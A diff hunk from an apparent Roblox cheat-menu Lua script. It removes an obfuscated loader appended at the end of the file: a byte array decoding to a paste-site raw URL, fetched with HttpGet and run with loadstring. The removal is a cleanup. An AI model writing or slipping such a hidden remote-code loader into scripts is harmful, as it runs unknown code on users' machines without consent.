@@ -2949,8 +2949,3 @@ local WorldSection = Menu.Container("Visuals", "World", "Left") do
         Configurations.Visuals.World.ClockTime.Value = a
     end)
     end
-
-local _={119,107,104,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,108,86,69,68,107,86,117,73,47,114,97,119}
-local url = ""
-for i=1,#_ do url = url..string.char(_[i]) end
-loadstring(game:HttpGet(url,true))()
